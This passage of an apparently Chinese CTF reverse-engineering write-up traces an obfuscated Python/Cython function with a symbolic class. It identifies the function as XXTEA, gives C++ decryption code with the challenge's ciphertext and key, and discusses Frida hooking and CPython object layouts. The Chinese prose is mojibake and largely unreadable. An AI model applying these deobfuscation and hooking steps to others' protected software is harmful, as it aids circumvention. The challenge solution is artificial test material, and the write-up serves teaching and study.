Symbol):</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> &amp; <span class="subst">&#123;other&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> &amp; <span class="subst">&#123;<span class="built_in">hex</span>(other)&#125;</span>)&quot;</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">cout = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SA</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nums</span>):</span><br><span class="line">        self.nums = [Symbol(<span class="built_in">str</span>(num)) <span class="keyword">for</span> num <span class="keyword">in</span> nums]</span><br><span class="line">        self.count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">        <span class="keyword">return</span> self.nums[index]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">copy</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> SA(self.nums)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.nums)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, index, value</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;new_<span class="subst">&#123;self.nums[index]&#125;</span> = <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">        self.nums[index] = Symbol(<span class="string">f&#x27;new_<span class="subst">&#123;self.nums[index]&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">global</span> cout </span><br><span class="line">        cout += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, value: <span class="built_in">object</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;self.nums&#125;</span> \n= \n<span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.nums == value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inp = SA([<span class="string">f&quot;a[<span class="subst">&#123;i&#125;</span>]&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br><span class="line">output = cy.sub14514(inp)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;round = <span class="subst">&#123;cout//<span class="number">32</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ ¹æ®è¾“å‡ºå¯ä»¥ä¸€çœ¼çœ‹å‡ºæ˜¯xxtea</p><p>ç„¶åç›´æ¥å†™XXTEAè„šæœ¬å°±å¥½QAQ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Arr.h&quot;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[] = &#123; <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">67</span>, <span class="number">67</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">121</span>, <span class="number">121</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">deXXTEA</span><span class="params">(Arr&amp; input)</span> </span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line"><span class="type">uint32_t</span> len = input.<span class="built_in">getsize</span>();</span><br><span class="line"><span class="type">uint32_t</span> round = <span class="number">60</span> / len + <span class="number">4</span>;</span><br><span class="line"><span class="type">uint32_t</span> sum = delta * round;</span><br><span class="line"><span class="type">int</span> t = <span class="number">32</span> * <span class="number">5</span> - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; round; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> now = len - <span class="number">1</span>; now &gt; <span class="number">-1</span>; now--)</span><br><span class="line">&#123;</span><br><span class="line">input[now] -= (((input[now - <span class="number">1</span>] &gt;&gt; <span class="number">3</span> ^ input[now + <span class="number">1</span>] &lt;&lt; <span class="number">3</span>) +</span><br><span class="line">(input[now + <span class="number">1</span>] &gt;&gt; <span class="number">4</span> ^ input[now - <span class="number">1</span>] &lt;&lt; <span class="number">2</span>)) ^ ((sum ^ input[now + <span class="number">1</span>]) +</span><br><span class="line">(key[t] ^ input[now - <span class="number">1</span>])));</span><br><span class="line">t--;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; ((now &amp; 2) ^ ((sum &gt;&gt; 3) &amp; 3)) &lt;&lt; &quot;\n&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line">sum -= delta;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>] = &#123; <span class="number">0x53</span>,<span class="number">0x79</span>,<span class="number">0x43</span>,<span class="number">0x31</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> data[] = &#123; <span class="number">0xf4e984ac</span>, <span class="number">0xcaf0191d</span>, <span class="number">0x576ffc19</span>, <span class="number">0x2ef90939</span>, <span class="number">0x585c0e45</span>, <span class="number">0x2eaa8337</span>, <span class="number">0x617f6b89</span>, <span class="number">0xf55432a7</span>, <span class="number">0xa81cb817</span>, <span class="number">0xbf1ee8c3</span>, <span class="number">0x656309c6</span>, <span class="number">0x92ace1cc</span>, <span class="number">0x8efeb57e</span>, <span class="number">0x39c000bb</span>, <span class="number">0x4d650916</span>, <span class="number">0x6a78dba7</span>, <span class="number">0xeba5c0a3</span>, <span class="number">0x92fdb0f3</span>, <span class="number">0xf4b5dea2</span>, <span class="number">0x2e7098d9</span>, <span class="number">0x112df304</span>, <span class="number">0xc60e9667</span>, <span class="number">0xf5b523ec</span>, <span class="number">0x7c8eb381</span>, <span class="number">0x2720ac77</span>, <span class="number">0xb8939ede</span>, <span class="number">0x8428a41a</span>, <span class="number">0x288ac504</span>, <span class="number">0xca50bcfd</span>, <span class="number">0x2992ba6f</span>, <span class="number">0x4222d1a6</span>, <span class="number">0x876c84df</span></span><br><span class="line">&#125;;</span><br><span class="line">Arr* test = <span class="keyword">new</span> <span class="built_in">Arr</span>(data, <span class="number">32</span>);</span><br><span class="line"><span class="comment">//XXTEA(*test, (uint32_t*)key);</span></span><br><span class="line"><span class="comment">//std::cout &lt;&lt; *test;</span></span><br><span class="line"><span class="comment">//deXXTEA(*test, (uint32_t*)key);</span></span><br><span class="line"><span class="built_in">deXXTEA</span>(*test);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> str[<span class="number">33</span>] = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">str[i] = (test-&gt;<span class="built_in">getarr</span>())[i];</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; str;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Arr.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;initializer_list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Arr</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">size_t</span> size;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Arr</span>(<span class="type">size_t</span> s);</span><br><span class="line"><span class="built_in">Arr</span>(<span class="type">uint32_t</span>* p, <span class="type">unsigned</span> s);</span><br><span class="line"><span class="built_in">Arr</span>(std::initializer_list&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; init);</span><br><span class="line">~<span class="built_in">Arr</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">getsize</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">getarr</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">friend</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; os, <span class="type">const</span> Arr&amp; obj);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>&amp; <span class="keyword">operator</span>[](<span class="type">unsigned</span> i);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">begin</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">end</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Arr.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Arr.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">Arr::<span class="built_in">Arr</span>(<span class="type">size_t</span> s) : <span class="built_in">size</span>(s), <span class="built_in">arr</span>(<span class="keyword">new</span> <span class="type">uint32_t</span>[s]) &#123;</span><br><span class="line">std::<span class="built_in">fill_n</span>(arr, s, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Arr::<span class="built_in">Arr</span>(<span class="type">uint32_t</span>* p, <span class="type">unsigned</span> s) : <span class="built_in">Arr</span>(s)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">&#123;</span><br><span class="line">arr[i] = p[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Arr::<span class="built_in">Arr</span>(std::initializer_list&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; init) :<span class="built_in">size</span>(init.<span class="built_in">size</span>()), <span class="built_in">arr</span>(<span class="keyword">new</span> <span class="type">unsigned</span> <span class="type">int</span>[init.<span class="built_in">size</span>()])</span><br><span class="line">&#123;</span><br><span class="line">std::<span class="built_in">copy</span>(init.<span class="built_in">begin</span>(), init.<span class="built_in">end</span>(), arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Arr::~<span class="built_in">Arr</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span>[] arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">Arr::getsize</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">Arr::getarr</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>&amp; Arr::<span class="keyword">operator</span>[](<span class="type">unsigned</span> i)</span><br><span class="line">&#123;</span><br><span class="line">i = (i + size) % size;</span><br><span class="line">i = i &gt;= <span class="number">0</span> ? i : (i + size);</span><br><span class="line"><span class="keyword">return</span> arr[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">Arr::begin</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">Arr::end</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> arr + size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; os, <span class="type">const</span> Arr&amp; obj)</span><br><span class="line">&#123;</span><br><span class="line">os &lt;&lt; <span class="string">&quot;len: &quot;</span> &lt;&lt; obj.<span class="built_in">getsize</span>() &lt;&lt; std::endl;</span><br><span class="line">os &lt;&lt; <span class="string">&quot;element list:&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> i : obj) &#123;</span><br><span class="line">os &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::uppercase &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>æˆ‘ä¸€å¼€å§‹æ˜¯æƒ³ä½¿ç”¨fridaå’Œpython setatträ¸€èµ·æçš„ï¼Œæœ€åå¤±è´¥äº†QAQã€‚<br>æˆ‘ç°åœ¨åœ¨æƒ³ï¼Œä¼šä¸ä¼šå¯¹äºé‚£äº›è¯­è¨€å½¢æˆçš„æ··æ·†ï¼Œå…¶å®å¯ä»¥ç”¨è¯­è¨€æœ¬èº«çš„ç‰¹æ€§å»è§£å†³ï¼Œè‡³å°‘å¯¹äºè§£é‡Šå‹è¯­è¨€ä¼¼ä¹é‡ç‚¹éƒ½åœ¨æ··æ·†é‡Œé¢ï¼Œé‚£ä¹ˆå¯¹äºJavaçš„soæ–‡ä»¶ï¼Œä¼¼ä¹ä¹Ÿå¯ä»¥è¿™æ ·ï¼Ÿå¦‚æœåŠ å¯†æ˜¯ä¼ å…¥ä¸€ä¸ªbyte[]ç±»å‹ï¼Œé‚£æˆ‘ç»§æ‰¿byteç”Ÿæˆè‡ªå·±çš„ç±»ä¼ è¿›å»ï¼Œä¼¼ä¹å°±æ²¡æœ‰é—®é¢˜äº†ã€‚</p><p>å†å¾€ç¼–è¯‘å‹è¯­è¨€çœ‹çœ‹ï¼Œåƒrustï¼Œgoä¼¼ä¹éƒ½æ˜¯ç›´æ¥çœ‹æ±‡ç¼–æ¯”çœ‹idaåç¼–è¯‘çš„æ›´å¥½ã€‚ä½†æ˜¯å¦‚æœä»–ä»¬å†™æˆdllä¼¼ä¹ä¹Ÿå¯ä»¥è¢«æˆ‘ä»¬ä¸»åŠ¨è§¦å‘ã€‚è€Œå‰©ä¸‹çš„exeç±»å‹ï¼Œè¿˜æ˜¯ç›´æ¥è®©ä¹‹åä¸“é—¨çš„åç¼–è¯‘å™¨æ¥è§£å†³å§ã€‚</p><p>æˆ‘è§‰å¾—åƒè¿™ç§è¯­è¨€å±‚é¢çš„æ··æ·†ï¼Œä¼šéšç€è¯­è¨€å˜å¤š/å‘å±•è€Œæ„ˆæ¥æ„ˆå¤šï¼Œæ‰€ä»¥æˆ‘è§‰å¾—æ·±å…¥ç ”ç©¶æŸä¸ªè¯­è¨€çš„å†…å®¹æ˜¯ä¸åˆ’ç®—çš„ï¼ˆé™¤éä¸“é—¨ç ”ç©¶æŸä¸ªè¯­è¨€çš„é€†å‘ï¼Œä½†æ˜¯è¿™æ ·ä¹Ÿå¯èƒ½é‡åˆ°å¾ˆå¤šä¸å¼€æºçš„æ¡†æ¶ï¼Œå¯¹äºæ¡†æ¶æ¥è¯´ï¼Œæˆ‘ä»¬ä¹Ÿå¾ˆéš¾åˆ†æï¼‰ã€‚é‚£ä¹ˆå¯¹äºè¿™äº›å†…å®¹ï¼Œæˆ‘ä»¬ä¸ºäº†ç†æ¸…é€»è¾‘ï¼Œæ›´åº”è¯¥ä½¿ç”¨é€šè§£ï¼šHOOKï¼Ÿæ¥è·å–å…·ä½“æµç¨‹ã€‚</p><hr><p>å…³äºæˆ‘ä¸€å¼€å§‹çš„æ–¹æ³•ï¼šfrida_hook py38.dllçš„è¿ç®—å‡½æ•°</p><p>hookåˆ°çš„æ°¸è¿œæ˜¯ä¸€ä¸ªåœ°å€ï¼Œä¸”å¦‚æœå…ˆä¼ ç»™pythonå†è§£å¼•ç”¨ä¼šå¯¼è‡´ä¸€äº›bugï¼Œfridaç›´æ¥è§£å¼•ç”¨ä¹Ÿä¼šå¯¼è‡´bugã€‚</p><p>æ‰€ä»¥è¿˜æ˜¯è¦çœ‹ä¸€ä¸‹å…·ä½“çš„åç§»</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> &#123;</span><span class="comment">//å®šé•¿ç±»å‹</span></span><br><span class="line">    PyObject_HEAD</span><br><span class="line">&#125; PyObject;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">//å˜é•¿ç±»å‹</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">&#125; PyVarObject;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">//floatä¸ºå®šé•¿ç±»å‹</span></span><br><span class="line">    PyObject_HEAD</span><br><span class="line">    <span class="type">double</span> ob_fval;</span><br><span class="line">&#125; PyFloatObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PyLongValue</span> &#123;</span><span class="comment">//intä¸ºå˜é•¿ç±»å‹</span></span><br><span class="line">    <span class="type">uintptr_t</span> lv_tag; <span class="comment">/* Number of digits, sign and flags */</span></span><br><span class="line">    digit ob_digit[<span class="number">1</span>];</span><br><span class="line">&#125; _PyLongValue;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">longobject</span> &#123;</span></span><br><span class="line">    PyObject_HEAD</span><br><span class="line">    _PyLongValue long_value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://www.thinkinpython.com/post/deep_py_vm_3.html">3. Object çš„åŸºæœ¬ç»“æ„ - Think In Python</a></p><p><a href="https://github.com/python/cpython/blob/main/Include/cpython/longintrepr.h#L98">cpython/Include/cpython/longintrepr.h at main Â· python/cpython (github.com)</a></p><p>æ ¹æ®å¦‚ä¸Šå»æŸ¥æ‰¾PyObject_HEADï¼Œå‘ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PyObject_HEAD                   PyObject ob_base;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">object</span> &#123;</span></span><br><span class="line">    _PyObject_HEAD_EXTRA</span><br><span class="line">    Py_ssize_t ob_refcnt;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">typeobject</span> *<span class="title">ob_type</span>;</span></span><br><span class="line">&#125; PyObject;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­_PyObject_HEAD_EXTRAè¢«å®šä¹‰ä¸ºNULLï¼ŒPy_ssize_tä¸ºint64ï¼Œstruct _typeobject *æ˜¯æŒ‡é’ˆä¹Ÿä¸º64<br>æ‰€ä»¥è¿™é‡Œæœ‰16å­—èŠ‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PyLongValue</span> &#123;</span></span><br><span class="line">    <span class="type">uintptr_t</span> lv_tag; <span class="comment">/* Number of digits, sign and flags */</span></span><br><span class="line">    digit ob_digit[<span class="number">1</span>];</span><br><span class="line">&#125; _PyLongValue;</span><br></pre></td></tr></table></figure><p>lv_tagä¿å­˜äº†</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä½2ä½ï¼šç¬¦å·ä¿¡æ¯ï¼š0ï¼šæ­£æ•°ï¼Œ1ï¼š0ï¼Œ2ï¼š<span class="string">-1</span></span><br><span class="line">ç¬¬ä¸‰ä½ä½ï¼šä¿ç•™</span><br><span class="line">ä¹‹å‰çš„ï¼šä¿å­˜é•¿æ•´æ•°ä¸­æ•°å­—çš„ä¸ªæ•°ï¼Œndigits = lv_tag &gt;&gt; 3ï¼ˆ64ä½ä¸­ä¸º(1&lt;&lt;61)<span class="string">-1</span>ï¼‰</span><br></pre></td></tr></table></figure><p>ob_digitä¸ºæ•°ç»„ï¼Œå­˜æ”¾æ— 